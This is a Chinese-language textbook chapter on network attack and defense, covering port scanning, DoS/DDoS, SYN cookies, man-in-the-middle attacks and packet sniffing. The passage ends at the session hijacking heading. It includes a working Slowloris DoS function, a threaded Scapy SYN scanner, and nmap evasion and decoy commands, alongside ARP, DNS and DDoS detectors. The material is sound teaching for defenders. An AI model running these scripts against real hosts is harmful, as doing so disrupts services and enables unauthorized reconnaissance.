# Chapter 26: 网络攻击与防御实战

> **学习目标**：
> - 理解网络侦察的原理与常见端口扫描技术（SYN/connect/FIN/XMAS/NULL）
> - 掌握 DoS/DDoS 攻击的原理及 SYN Cookie 等防御机制
> - 了解中间人攻击（ARP欺骗、DNS缓存投毒、BGP劫持）的实现与检测
> - 学会使用数据包嗅探与会话劫持技术进行安全审计
> - 掌握 Web 安全中 XSS 和 CSRF 的网络视角分析
> - 熟悉速率限制、BCP38、RTBH、清洗中心等防御策略
> - 了解 SIEM、NetFlow/sFlow、日志分析等安全监控体系

---

## 26.1 网络侦察

网络侦察（Reconnaissance）是攻击者在发动攻击前收集目标信息的阶段。侦察活动包括端口扫描、服务识别、OS 指纹识别等。理解侦察技术是防御的第一步。

### 26.1.1 端口扫描基础

端口扫描是向目标主机的 TCP/UDP 端口发送探测包，根据响应判断端口状态的技术。

**端口状态**：
- **Open（开放）**：端口有服务监听，接受连接
- **Closed（关闭）**：端口无服务，但主机可达
- **Filtered（过滤）**：防火墙丢弃了探测包，无法确定状态

### 26.1.2 TCP SYN 扫描（半连接扫描）

SYN 扫描是最常见的扫描方式，发送 SYN 包但不完成三次握手：

```
攻击者                    目标主机
  |                          |
  |--- SYN (port 80) ------->|
  |                          |
  |<-- SYN+ACK (port open) --|   端口开放
  |--- RST ------------------>|   立即断开
  |                          |
  |--- SYN (port 443) ------>|
  |                          |
  |<-- RST (port closed) ----|   端口关闭
```

**优势**：速度快、隐蔽性好（不建立完整连接，部分系统不记录半连接）

### 26.1.3 TCP Connect 扫描

Connect 扫描使用完整的 TCP 三次握手，然后主动关闭连接：

```
攻击者                    目标主机
  |                          |
  |--- SYN ----------------->|
  |<-- SYN+ACK --------------|
  |--- ACK ----------------->|   连接建立
  |--- RST/FIN ------------->|   主动关闭
```

**特点**：容易被日志记录，但不需要 root 权限

### 26.1.4 FIN/XMAS/NULL 扫描

这三种扫描利用 RFC 793 的行为规范：

- **FIN 扫描**：只发送 FIN 包。关闭端口回复 RST，开放端口忽略
- **XMAS 扫描**：设置 FIN+PSH+URG 标志位（"圣诞树"包）
- **NULL 扫描**：不设置任何标志位

```
FIN 扫描原理：

发送 FIN → 开放端口: 无响应（忽略）
发送 FIN → 关闭端口: RST 响应

注意：Windows 系统不遵循 RFC 793，所有端口都返回 RST
```

### 26.1.5 nmap 使用详解

nmap 是最流行的网络扫描工具，支持多种扫描模式。

```bash
# 基本 SYN 扫描（需要 root 权限）
sudo nmap -sS 192.168.1.0/24

# TCP Connect 扫描
nmap -sT 192.168.1.1

# FIN 扫描
sudo nmap -sF 192.168.1.1

# XMAS 扫描
sudo nmap -sX 192.168.1.1

# NULL 扫描
sudo nmap -sN 192.168.1.1

# UDP 扫描
sudo nmap -sU 192.168.1.1

# 服务版本检测
sudo nmap -sV 192.168.1.1

# OS 指纹识别
sudo nmap -O 192.168.1.1

# 综合扫描（版本检测 + OS 识别 + 脚本扫描 + 端口扫描）
sudo nmap -A 192.168.1.1

# 指定端口范围
sudo nmap -p 1-1024 192.168.1.1

# 快速扫描前 100 个常用端口
nmap -F 192.168.1.1

# 扫描所有 65535 个端口
sudo nmap -p- 192.168.1.1

# 使用脚本引擎扫描漏洞
sudo nmap --script vuln 192.168.1.1

# 防火墙逃逸：分段扫描
sudo nmap -f 192.168.1.1

# 使用诱饵扫描（隐藏真实 IP）
sudo nmap -D RND:10 192.168.1.1

# 慢速扫描（规避 IDS）
sudo nmap -T0 192.168.1.1

# 输出格式
sudo nmap -oN output.txt 192.168.1.1    # 普通文本
sudo nmap -oX output.xml 192.168.1.1    # XML 格式
sudo nmap -oG output.gnmap 192.168.1.1  # Grepable 格式
```

### 26.1.6 OS 指纹识别

OS 指纹识别通过分析 TCP/IP 协议栈的实现差异来判断目标操作系统。

**关键指纹特征**：
- **TTL 初始值**：Linux=64, Windows=128, Solaris=255
- **TCP 窗口大小**：不同 OS 默认值不同
- **TCP Options 顺序**：不同 OS 的选项排列不同
- **DF 位（Don't Fragment）**：是否设置
- **MSS（Maximum Segment Size）**：默认值差异

```python
from scapy.all import *

def os_fingerprint(target_ip):
    """基于 TTL 和窗口大小的简单 OS 指纹识别"""
    pkt = IP(dst=target_ip) / TCP(dport=80, flags="S")
    resp = sr1(pkt, timeout=2, verbose=0)

    if resp is None:
        return "No response (host down or filtered)"

    ttl = resp[IP].ttl
    window = resp[TCP].window

    os_guess = "Unknown"

    # TTL 初始值推断
    if ttl <= 64:
        ttl_os = "Linux/Unix"
        initial_ttl = 64
    elif ttl <= 128:
        ttl_os = "Windows"
        initial_ttl = 128
    else:
        ttl_os = "Solaris/Cisco"
        initial_ttl = 255

    hop_count = initial_ttl - ttl

    # 窗口大小辅助判断
    if window == 5840 or window == 5792:
        os_guess = "Linux 2.4/2.6"
    elif window == 65535:
        os_guess = "Windows (older)"
    elif window == 8192:
        os_guess = "Windows Vista/7/10"
    elif window == 29200:
        os_guess = "Linux 2.6 (modern)"
    else:
        os_guess = ttl_os

    return {
        "target": target_ip,
        "ttl": ttl,
        "window": window,
        "hop_count": hop_count,
        "os_guess": os_guess
    }

result = os_fingerprint("192.168.1.1")
print(f"Target: {result['target']}")
print(f"TTL: {result['ttl']}, Window: {result['window']}")
print(f"Estimated hops: {result['hop_count']}")
print(f"OS guess: {result['os_guess']}")
```

### 26.1.7 端口扫描器的 SYN 半连接探测引擎

<div data-component="PortScannerSynEngine"></div>

下面实现一个基于 Scapy 的 SYN 半连接扫描引擎：

```python
#!/usr/bin/env python3
"""
SYN 半连接端口扫描引擎
使用 Scapy 实现 SYN 扫描，支持多线程并发和结果聚合
"""
import sys
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from scapy.all import IP, TCP, sr1, conf, RandShort

conf.verb = 0  # 禁用 Scapy 详细输出


class PortScanner:
    """SYN 半连接端口扫描器"""

    # 常见端口及其服务
    COMMON_PORTS = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
        53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP",
        443: "HTTPS", 993: "IMAPS", 995: "POP3S",
        3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL",
        6379: "Redis", 8080: "HTTP-Proxy", 8443: "HTTPS-Alt",
        27017: "MongoDB"
    }

    def __init__(self, target, ports=None, timeout=2, max_threads=50):
        self.target = target
        self.ports = ports or list(self.COMMON_PORTS.keys())
        self.timeout = timeout
        self.max_threads = max_threads
        self.results = {"open": [], "closed": [], "filtered": []}
        self.lock = threading.Lock()

    def scan_port(self, port):
        """扫描单个端口（SYN 半连接）"""
        sport = RandShort()
        pkt = IP(dst=self.target) / TCP(
            sport=sport, dport=port, flags="S"
        )
        resp = sr1(pkt, timeout=self.timeout, verbose=0)

        with self.lock:
            if resp is None:
                self.results["filtered"].append(port)
                return (port, "filtered")
            elif resp.haslayer(TCP):
                tcp_layer = resp[TCP]
                if tcp_layer.flags == 0x12:  # SYN+ACK
                    # 发送 RST 关闭连接
                    rst_pkt = IP(dst=self.target) / TCP(
                        sport=sport, dport=port, flags="R"
                    )
                    sr1(rst_pkt, timeout=1, verbose=0)
                    self.results["open"].append(port)
                    return (port, "open")
                elif tcp_layer.flags == 0x14:  # RST+ACK
                    self.results["closed"].append(port)
                    return (port, "closed")
            elif resp.haslayer(ICMP):
                icmp_type = resp[ICMP].type
                icmp_code = resp[ICMP].code
                if icmp_type == 3 and icmp_code in [1, 2, 3, 9, 10, 13]:
                    self.results["filtered"].append(port)
                    return (port, "filtered")

            self.results["filtered"].append(port)
            return (port, "filtered")

    def run(self):
        """执行并发扫描"""
        print(f"[*] Scanning {self.target}")
        print(f"[*] Ports: {len(self.ports)} | Threads: {self.max_threads}")
        print(f"[*] Timeout: {self.timeout}s per port")
        print("-" * 60)

        start_time = time.time()

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = {
                executor.submit(self.scan_port, port): port
                for port in self.ports
            }
            for future in as_completed(futures):
                port, status = future.result()
                if status == "open":
                    service = self.COMMON_PORTS.get(port, "unknown")
                    print(f"  [+] {port}/tcp OPEN  ({service})")

        elapsed = time.time() - start_time

        print("-" * 60)
        print(f"[*] Scan completed in {elapsed:.2f}s")
        print(f"    Open: {len(self.results['open'])} | "
              f"Closed: {len(self.results['closed'])} | "
              f"Filtered: {len(self.results['filtered'])}")

        return self.results


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: sudo python3 scanner.py <target> [port1,port2,...]")
        sys.exit(1)

    target = sys.argv[1]

    if len(sys.argv) > 2:
        ports = [int(p) for p in sys.argv[2].split(",")]
    else:
        ports = None

    scanner = PortScanner(target, ports=ports)
    results = scanner.run()
```

---

## 26.2 DoS/DDoS 攻击与防御

拒绝服务攻击（DoS）旨在使目标系统无法正常提供服务。分布式拒绝服务攻击（DDoS）利用大量被控制的主机（僵尸网络）同时发起攻击。

### 26.2.1 SYN Flood 攻击

SYN Flood 是最经典的 DoS 攻击，利用 TCP 三次握手的缺陷：

```
正常连接：
  Client → SYN → Server
  Client ← SYN+ACK ← Server
  Client → ACK → Server
  连接建立

SYN Flood 攻击：
  攻击者 → SYN (伪造源IP) → Server
  攻击者 → SYN (伪造源IP) → Server
  攻击者 → SYN (伪造源IP) → Server
  ...
  Server 的 SYN 队列被填满，无法接受新连接
```

**攻击原理**：
1. 攻击者发送大量 SYN 包，使用伪造的源 IP 地址
2. 服务器为每个 SYN 分配资源（SYN 队列条目），回复 SYN+ACK
3. 由于源 IP 是伪造的，服务器永远不会收到 ACK
4. SYN 队列被填满，合法连接被拒绝

### 26.2.2 Slowloris 攻击

Slowloris 是一种低带宽 DoS 攻击，通过保持大量半开 HTTP 连接耗尽服务器资源：

```python
import socket
import time
import threading

def slowloris_attack(target_host, target_port=80, num_connections=200):
    """
    Slowloris 攻击原理演示
    注意：仅用于教学目的，实际使用属于违法行为
    """
    sockets = []

    # 建立初始连接
    for i in range(num_connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_host, target_port))
            # 发送不完整的 HTTP 请求
            s.send(f"GET / HTTP/1.1\r\n".encode())
            s.send(f"Host: {target_host}\r\n".encode())
            sockets.append(s)
        except Exception:
            pass

    # 定期发送不完整的头部，保持连接活跃
    while True:
        for s in sockets:
            try:
                # 发送一个不完整的头部行
                s.send(f"X-a: {time.time()}\r\n".encode())
            except Exception:
                sockets.remove(s)
                try:
                    new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    new_s.settimeout(4)
                    new_s.connect((target_host, target_port))
                    new_s.send(f"GET / HTTP/1.1\r\n".encode())
                    new_s.send(f"Host: {target_host}\r\n".encode())
                    sockets.append(new_s)
                except Exception:
                    pass
        time.sleep(15)  # 每15秒发送一个头部保持连接
```

### 26.2.3 DNS 放大攻击

DNS 放大攻击利用 DNS 递归查询的放大效应，是一种反射放大攻击：

```
攻击原理：

1. 攻击者向开放 DNS 递归解析器发送小型查询
   源 IP 伪造为受害者 IP
   查询包大小: ~60 字节

2. DNS 服务器向"受害者"返回大型响应
   响应包大小: ~3000 字节（启用 EDNS0 时）

3. 放大倍数 = 3000 / 60 = 50 倍

攻击者 --[伪造源IP]--> DNS Resolver --[大型响应]--> 受害者
   60 bytes                                    3000 bytes
```

**典型的放大查询类型**：
- `ANY` 查询：返回所有 DNS 记录
- `TXT` 记录：通常包含大量数据
- `DNSSEC` 响应：包含签名数据，体积更大

### 26.2.4 NTP 放大攻击

NTP 放大攻击利用 NTP 服务器的 `monlist` 命令：

```bash
# monlist 命令返回与服务器交互的最近 600 个客户端
# 请求包: ~234 字节
# 响应包: 可达 ~48,000 字节
# 放大倍数: ~200 倍

# 检测 NTP 服务器是否支持 monlist
ntpdc -n -c monlist target_ntp_server

# 防御：禁用 monlist
# 在 ntp.conf 中添加：
# disable monitor
```

### 26.2.5 SYN Cookie 防御机制详解

<div data-component="SYNCookieDefense"></div>

SYN Cookie 是防御 SYN Flood 攻击的核心技术，由 Daniel J. Bernstein 发明。

**原理**：不为 SYN 请求分配队列空间，而是将连接信息编码到 SYN+ACK 的序列号中。

```
SYN Cookie 工作流程：

1. 收到 SYN 包
   不分配队列空间

2. 生成 SYN+ACK
   初始序列号 = f(src_ip, src_port, dst_ip, dst_port, timestamp, secret)
   将 MSS、窗口缩放等信息编码到序列号中

3. 收到 ACK
   验证 ACK 序列号是否合法
   如果合法，重建连接状态
   如果不合法，丢弃

序列号编码结构（32 位）：
  高 5 位: t mod 32 (时间戳计数器)
  中 3 位: MSS 索引
  低 24 位: hash(src_ip, src_port, dst_ip, dst_port, t, secret)
```

```c
/*
 * SYN Cookie 核心算法（Linux 内核简化版本）
 * 参考: net/ipv4/syncookies.c
 */

#include <stdint.h>
#include <string.h>

#define COOKIEBITS 24
#define COOKIEMASK (((uint32_t)1 << COOKIEBITS) - 1)

/* MSS 索引表 */
static const uint16_t mss_table[] = {
    64, 128, 256, 512, 536, 1024, 1440, 1460,
    4312, 8960, 16384, 32768, 65535
};
#define MSS_TABLE_SIZE (sizeof(mss_table) / sizeof(mss_table[0]))

/* 简化的 hash 函数 */
static uint32_t cookie_hash(uint32_t src_ip, uint16_t src_port,
                            uint32_t dst_ip, uint16_t dst_port,
                            uint32_t count)
{
    /* 实际实现使用 SipHash 或类似的安全哈希 */
    uint32_t hash = src_ip ^ src_port ^ dst_ip ^ dst_port;
    hash = hash * 2654435761U;  /* Knuth's multiplicative hash */
    hash ^= count;
    return hash;
}

/* 生成 SYN Cookie */
uint32_t generate_syn_cookie(uint32_t src_ip, uint16_t src_port,
                             uint32_t dst_ip, uint16_t dst_port,
                             uint16_t mss_index, uint32_t timestamp)
{
    uint32_t count = timestamp >> 6;  /* 每 64 秒更新一次 */
    uint32_t cookie = cookie_hash(src_ip, src_port,
                                  dst_ip, dst_port, count);

    /* 编码 MSS 索引到 cookie 中 */
    cookie &= ~0x1F;  /* 清除低 5 位（保留给 mss_index 的 3 位和额外标志） */
    cookie |= (mss_index & 0x7);  /* 低 3 位存储 MSS 索引 */

    return cookie;
}

/* 验证 SYN Cookie 并恢复 MSS */
int validate_syn_cookie(uint32_t cookie, uint32_t src_ip, uint16_t src_port,
                        uint32_t dst_ip, uint16_t dst_port,
                        uint32_t current_timestamp)
{
    uint32_t count = current_timestamp >> 6;

    /* 检查当前时间窗口和前一个窗口 */
    for (int i = 0; i < 2; i++) {
        uint32_t expected = cookie_hash(src_ip, src_port,
                                        dst_ip, dst_port, count - i);
        expected &= ~0x1F;
        expected |= (cookie & 0x1F);

        if ((cookie & COOKIEMASK) == (expected & COOKIEMASK)) {
            /* 恢复 MSS */
            uint32_t mss_index = cookie & 0x7;
            if (mss_index < MSS_TABLE_SIZE) {
                return mss_table[mss_index];
            }
        }
    }
    return -1;  /* Cookie 无效 */
}

/* 查找最接近但不超过给定 MSS 的表项索引 */
int syn_cookie_mss_index(uint16_t mss)
{
    int i;
    for (i = MSS_TABLE_SIZE - 1; i >= 0; i--) {
        if (mss >= mss_table[i])
            break;
    }
    return i < 0 ? 0 : i;
}
```

**Linux 内核启用 SYN Cookie**：

```bash
# 检查当前状态
cat /proc/sys/net/ipv4/tcp_syncookies

# 启用 SYN Cookie（1=启用）
echo 1 > /proc/sys/net/ipv4/tcp_syncookies

# 永久启用
echo "net.ipv4.tcp_syncookies = 1" >> /etc/sysctl.conf
sysctl -p

# 查看 SYN 队列状态
cat /proc/sys/net/ipv4/tcp_max_syn_backlog
# 增大 SYN 队列
echo 4096 > /proc/sys/net/ipv4/tcp_max_syn_backlog
```

### 26.2.6 DDoS 攻击的流量特征

```python
import time
from collections import defaultdict

class DDoSDetector:
    """基于流量特征的 DDoS 检测器"""

    def __init__(self, window_size=60, threshold=1000):
        self.window_size = window_size      # 检测窗口（秒）
        self.threshold = threshold           # 流量阈值（包/秒）
        self.packet_counts = defaultdict(list)
        self.syn_counts = defaultdict(list)

    def record_packet(self, src_ip, dst_ip, flags=""):
        """记录数据包"""
        now = time.time()
        self.packet_counts[dst_ip].append(now)

        if "S" in flags and "A" not in flags:
            self.syn_counts[dst_ip].append(now)

    def clean_old_entries(self, dst_ip):
        """清理过期记录"""
        cutoff = time.time() - self.window_size
        self.packet_counts[dst_ip] = [
            t for t in self.packet_counts[dst_ip] if t > cutoff
        ]
        self.syn_counts[dst_ip] = [
            t for t in self.syn_counts[dst_ip] if t > cutoff
        ]

    def detect(self, dst_ip):
        """检测是否遭受 DDoS 攻击"""
        self.clean_old_entries(dst_ip)

        total_pps = len(self.packet_counts[dst_ip]) / self.window_size
        syn_pps = len(self.syn_counts[dst_ip]) / self.window_size
        syn_ratio = syn_pps / max(total_pps, 0.001)

        alerts = []

        if total_pps > self.threshold:
            alerts.append({
                "type": "HIGH_TRAFFIC",
                "severity": "HIGH",
                "detail": f"Traffic rate: {total_pps:.0f} pps "
                          f"(threshold: {self.threshold} pps)"
            })

        # SYN Flood 检测：SYN 包占比超过 80%
        if syn_ratio > 0.8 and syn_pps > self.threshold * 0.5:
            alerts.append({
                "type": "SYN_FLOOD",
                "severity": "CRITICAL",
                "detail": f"SYN rate: {syn_pps:.0f} pps, "
                          f"ratio: {syn_ratio:.1%}"
            })

        return alerts
```

---

## 26.3 中间人攻击

中间人攻击（Man-in-the-Middle, MitM）是指攻击者秘密介入通信双方之间，截获、篡改或伪造通信数据。

### 26.3.1 ARP 欺骗

ARP 欺骗是最常见的局域网中间人攻击，通过发送伪造的 ARP 响应包来污染目标的 ARP 缓存。

```
正常通信：
  主机 A (192.168.1.10) ←→ 网关 (192.168.1.1)
  MAC-A                  MAC-GW

ARP 欺骗后：
  主机 A (192.168.1.10) → 攻击者 → 网关 (192.168.1.1)
  ARP缓存: 192.168.1.1 = MAC-ATTACKER

攻击流程：
  1. 攻击者向主机 A 发送 ARP 回复：
     "192.168.1.1 的 MAC 地址是 MAC-ATTACKER"
  2. 攻击者向网关发送 ARP 回复：
     "192.168.1.10 的 MAC 地址是 MAC-ATTACKER"
  3. 主机 A 发给网关的流量经过攻击者
  4. 网关发给主机 A 的流量也经过攻击者
```

```python
#!/usr/bin/env python3
"""
ARP 欺骗检测器
监听 ARP 包，检测异常的 ARP 响应（MAC-IP 绑定冲突）
"""
from scapy.all import sniff, ARP, Ether
import time
from collections import defaultdict

class ARPSpoofDetector:
    """ARP 欺骗检测器：MAC-IP 绑定验证逻辑"""

    def __init__(self):
        # 已知的合法 MAC-IP 绑定表
        self.binding_table = {}
        # 每个 IP 已确认的 MAC 地址（第一次看到的被认为合法）
        self.confirmed_mac = {}
        # 告警历史（防重复）
        self.alert_history = set()
        # ARP 请求频率统计
        self.arp_rate = defaultdict(list)

    def update_binding(self, ip, mac):
        """
        更新 MAC-IP 绑定记录
        如果 IP 已有绑定但 MAC 不同，触发告警
        """
        if ip in self.confirmed_mac:
            if self.confirmed_mac[ip] != mac:
                alert_key = f"{ip}:{mac}:{self.confirmed_mac[ip]}"
                if alert_key not in self.alert_history:
                    self.alert_history.add(alert_key)
                    return {
                        "type": "ARP_SPOOF",
                        "severity": "CRITICAL",
                        "ip": ip,
                        "known_mac": self.confirmed_mac[ip],
                        "new_mac": mac,
                        "timestamp": time.time()
                    }
        else:
            self.confirmed_mac[ip] = mac

        return None

    def check_arp_rate(self, src_mac, window=10, threshold=50):
        """
        检测 ARP 请求洪泛
        正常主机不会在短时间内发送大量 ARP 请求
        """
        now = time.time()
        self.arp_rate[src_mac].append(now)

        # 清理过期记录
        self.arp_rate[src_mac] = [
            t for t in self.arp_rate[src_mac]
            if now - t < window
        ]

        if len(self.arp_rate[src_mac]) > threshold:
            return {
                "type": "ARP_FLOOD",
                "severity": "HIGH",
                "src_mac": src_mac,
                "rate": len(self.arp_rate[src_mac]) / window,
                "timestamp": now
            }
        return None

    def check_gratuitous_arp(self, pkt):
        """
        检测免费 ARP（Gratuitous ARP）
        免费 ARP 是 ARP 回复但请求和目标 IP 相同
        攻击者常用免费 ARP 来广播虚假绑定
        """
        if pkt[ARP].op == 2:  # ARP reply
            if pkt[ARP].psrc == pkt[ARP].pdst:
                return {
                    "type": "GRATUITOUS_ARP",
                    "severity": "MEDIUM",
                    "ip": pkt[ARP].psrc,
                    "mac": pkt[ARP].hwsrc,
                    "timestamp": time.time()
                }
        return None

    def process_packet(self, pkt):
        """处理捕获的 ARP 包"""
        if not pkt.haslayer(ARP):
            return

        arp = pkt[ARP]
        src_ip = arp.psrc
        src_mac = arp.hwsrc

        alerts = []

        # 检查 MAC-IP 绑定冲突
        if arp.op == 2:  # ARP Reply
            alert = self.update_binding(src_ip, src_mac)
            if alert:
                alerts.append(alert)

        # 检测 ARP 请求洪泛
        if arp.op == 1:  # ARP Request
            alert = self.check_arp_rate(src_mac)
            if alert:
                alerts.append(alert)

        # 检测免费 ARP
        alert = self.check_gratuitous_arp(pkt)
        if alert:
            alerts.append(alert)

        # 输出告警
        for alert in alerts:
            self.print_alert(alert)

    def print_alert(self, alert):
        """格式化输出告警"""
        print(f"\n{'='*60}")
        print(f"[ALERT] {alert['type']} - {alert['severity']}")
        print(f"  Time: {time.ctime(alert['timestamp'])}")
        for k, v in alert.items():
            if k not in ('type', 'severity', 'timestamp'):
                print(f"  {k}: {v}")
        print(f"{'='*60}\n")

    def start(self, interface="eth0"):
        """开始监听"""
        print(f"[*] ARP Spoof Detector started on {interface}")
        print(f"[*] Listening for ARP packets...")
        sniff(
            iface=interface,
            filter="arp",
            prn=self.process_packet,
            store=0
        )


if __name__ == "__main__":
    detector = ARPSpoofDetector()

    # 可选：预设已知的合法绑定
    # detector.confirmed_mac["192.168.1.1"] = "aa:bb:cc:dd:ee:ff"

    detector.start(interface="en0")
```

### 26.3.2 ARP 欺骗检测器的 MAC-IP 绑定验证逻辑

<div data-component="ARPSpoofDetector"></div>

MAC-IP 绑定验证的核心逻辑：

```
绑定验证流程：

1. 监听所有 ARP Reply 包
2. 提取 (IP, MAC) 对
3. 查询已知绑定表：
   ├─ IP 未记录 → 首次见到，记录为合法绑定
   └─ IP 已记录 →
       ├─ MAC 匹配 → 正常，更新时间戳
       └─ MAC 不匹配 → 告警！可能的 ARP 欺骗

4. 辅助检测：
   - ARP 请求频率异常（洪泛检测）
   - 免费 ARP 异常广播
   - 网关 MAC 变化检测
```

### 26.3.3 DNS 缓存投毒

DNS 缓存投毒（Cache Poisoning）通过向 DNS 缓存服务器注入虚假记录来劫持域名解析。

**Kaminsky 攻击**（2008 年发现）：

```
攻击流程：

1. 攻击者向目标 DNS 递归解析器查询一个随机子域名
   查询: random123.example.com

2. 攻击者同时向解析器发送大量伪造的 DNS 响应
   伪造响应：example.com NS ns.evil.com
   伪造响应的事务 ID 需要猜对（65536 种可能）

3. 如果伪造响应先于真实响应到达：
   - 解析器缓存了 example.com → ns.evil.com
   - 后续所有 example.com 的查询都被劫持

4. Kaminy 攻击的创新：
   - 查询随机子域名，确保缓存未命中
   - 伪造的是 NS 记录而非 A 记录
   - 一次成功即可劫持整个域名
```

```python
"""
DNS 缓存投毒检测
检测 DNS 响应中的异常情况
"""
from scapy.all import sniff, DNS, DNSRR, IP
from collections import defaultdict
import time

class DNSPoisonDetector:
    def __init__(self):
        # 记录每个域名的权威 NS 记录
        self.authoritative_ns = {}
        # 记录 DNS 响应来源
        self.response_sources = defaultdict(list)

    def analyze_response(self, pkt):
        """分析 DNS 响应包"""
        if not pkt.haslayer(DNS):
            return

        dns = pkt[DNS]

        # 只分析 DNS 响应
        if dns.qr != 1:
            return

        # 检查事务 ID 是否可疑（值过小或有规律）
        tx_id = dns.id

        # 分析应答记录
        if dns.an:
            for i in range(dns.ancount):
                rr = dns.an[i] if dns.ancount == 1 else dns.an
                if hasattr(rr, 'type') and rr.type == 1:  # A 记录
                    domain = rr.rrname.decode() if isinstance(
                        rr.rrname, bytes) else rr.rrname
                    ip = rr.rdata

                    self.check_suspicious_a_record(domain, ip, pkt[IP].src)

    def check_suspicious_a_record(self, domain, ip, dns_server):
        """检查可疑的 A 记录"""
        # 检查是否将域名解析到私有 IP
        if self.is_private_ip(ip):
            print(f"[WARNING] DNS response maps {domain} to private IP {ip}")
            print(f"  From DNS server: {dns_server}")

        # 检查同一域名的解析结果是否频繁变化
        self.response_sources[domain].append({
            "ip": ip,
            "server": dns_server,
            "time": time.time()
        })

    @staticmethod
    def is_private_ip(ip):
        """检查是否为私有 IP 地址"""
        parts = ip.split(".")
        if len(parts) != 4:
            return False
        first, second = int(parts[0]), int(parts[1])
        return (first == 10 or
                (first == 172 and 16 <= second <= 31) or
                (first == 192 and second == 168))
```

### 26.3.4 BGP 劫持

BGP 劫持（BGP Hijacking）是指攻击者通过发布虚假的 BGP 路由通告来劫持互联网流量。

```
BGP 劫持原理：

正常路由：
  AS100 → AS200 → AS300 (目标网络)
  流量沿着正常的 AS 路径到达目标

BGP 劫持后：
  AS100 → AS-ATTACKER (声称拥有 AS300 的路由)
  流量被错误地导向攻击者的网络

劫持类型：
1. 前缀劫持：攻击者宣告一个更具体的前缀
   原始：192.0.2.0/24 → AS300
   劫持：192.0.2.0/25 → AS-ATTACKER (更具体，优先级更高)

2. 路径伪造：攻击者伪造 AS-PATH
   使路径看起来更短，吸引更多流量

3. 路由泄露：将内部路由错误地向外宣告
   2016 年 Google 通过日本电信的路由泄露事件
```

```bash
# 使用 BIRD 路由软件配置 BGP 基础防护
# /etc/bird/bird.conf

router id 192.168.1.1;

filter bgp_import {
    # 拒绝过于具体的前缀（防前缀劫持）
    if (net.len > 24) then reject;

    # 拒绝私有 AS 号（RFC 6996）
    if (bgp_path ~ [= *64512..65534 * =]) then reject;

    # 拒绝过长的 AS-PATH
    if (length(bgp_path) > 10) then reject;

    # 接受其他路由
    accept;
}

protocol bgp upstream {
    local as 65001;
    neighbor 203.0.113.1 as 65000;
    import filter bgp_import;
    export where proto = "static";
}
```

---

## 26.4 数据包嗅探与会话劫持

### 26.4.1 数据包嗅探

数据包嗅探（Packet Sniffing）是捕获和分析网络流量的技术。在交换网络中，攻击者需要配合 ARP 欺骗才能嗅探到其他主机的流量。

```bash
# tcpdump 基础使用
# 捕获特定接口的流量
sudo tcpdump -i eth0

# 捕获特定主机的流量
sudo tcpdump host 192.168.1.100

# 捕获特定端口的流量
sudo tcpdump port 80

# 捕获 TCP SYN 包
sudo tcpdump 'tcp[tcpflags] & tcp-syn != 0'

# 捕获 HTTP GET 请求
sudo tcpdump -A 'tcp port 80 and tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420'

# 捕获 DNS 查询
sudo tcpdump -i eth0 port 53

# 保存到文件（Wireshark 格式）
sudo tcpdump -i eth0 -w capture.pcap

# 读取 pcap 文件
tcpdump -r capture.pcap

# 限制捕获包数量
sudo tcpdump -c 1000 -i eth0

# 显示详细信息
sudo tcpdump -vvv -i eth0

# 按网段过滤
sudo tcpdump net 192.168.1.0/24
```

```python
#!/usr/bin/env python3
"""
网络数据包嗅探器
使用 Scapy 捕获和分析网络流量
"""
from scapy.all import sniff, IP, TCP, UDP, DNS, Raw
import datetime

class PacketSniffer:
    """网络数据包嗅探器"""

    def __init__(self, interface=None, filter_str=None):
        self.interface = interface
        self.filter_str = filter_str
        self.packet_count = 0
        self.protocols = {}

    def process_packet(self, pkt):
        """处理每个捕获的数据包"""
        self.packet_count += 1
        timestamp = datetime.datetime.now().strftime("%H:%M:%S.%f")

        if pkt.haslayer(IP):
            src_ip = pkt[IP].src
            dst_ip = pkt[IP].dst
            proto = pkt[IP].proto

            # TCP 分析
            if pkt.haslayer(TCP):
                src_port = pkt[TCP].sport
                dst_port = pkt[TCP].dport
                flags = pkt[TCP].flags

                flag_str = self.tcp_flags_to_str(flags)

                print(f"[{timestamp}] TCP {src_ip}:{src_port} → "
                      f"{dst_ip}:{dst_port} [{flag_str}]")

                # 提取 HTTP 数据
                if pkt.haslayer(Raw):
                    payload = pkt[Raw].load
                    if b"HTTP" in payload or b"GET" in payload or b"POST" in payload:
                        try:
                            http_data = payload.decode('utf-8', errors='ignore')
                            first_line = http_data.split('\r\n')[0]
                            print(f"  HTTP: {first_line}")
                        except Exception:
                            pass

            # UDP 分析
            elif pkt.haslayer(UDP):
                src_port = pkt[UDP].sport
                dst_port = pkt[UDP].dport

                print(f"[{timestamp}] UDP {src_ip}:{src_port} → "
                      f"{dst_ip}:{dst_port}")

                # DNS 分析
                if pkt.haslayer(DNS):
                    dns = pkt[DNS]
                    if dns.qr == 0:  # DNS 查询
                        qname = dns.qd.qname.decode() if dns.qd else "?"
                        print(f"  DNS Query: {qname}")
                    else:  # DNS 响应
                        if dns.an:
                            print(f"  DNS Response: {dns.an.rrname}")

    @staticmethod
    def tcp_flags_to_str(flags):
        """将 TCP 标志位转换为可读字符串"""
        flag_names = []
        if flags & 0x01: flag_names.append("FIN")
        if flags & 0x02: flag_names.append("SYN")
        if flags & 0x04: flag_names.append("RST")
        if flags & 0x08: flag_names.append("PSH")
        if flags & 0x10: flag_names.append("ACK")
        if flags & 0x20: flag_names.append("URG")
        return ",".join(flag_names) if flag_names else "NONE"

    def start(self, count=0):
        """开始嗅探"""
        print(f"[*] Starting packet sniffer on {self.interface or 'default'}")
        if self.filter_str:
            print(f"[*] BPF filter: {self.filter_str}")
        print(f"[*] Press Ctrl+C to stop\n")

        try:
            sniff(
                iface=self.interface,
                filter=self.filter_str,
                prn=self.process_packet,
                count=count,
                store=0
            )
        except KeyboardInterrupt:
            print(f"\n[*] Stopped. Total packets captured: {self.packet_count}")


if __name__ == "__main__":
    sniffer = PacketSniffer(
        interface="en0",
        filter_str="tcp port 80 or port 53"
    )
    sniffer.start()
```

### 26.4.2 会话劫持

会话劫持（Session Hijacking）是指攻击者接管已建立的 TCP 会话。

```
TCP 会话劫持流程：

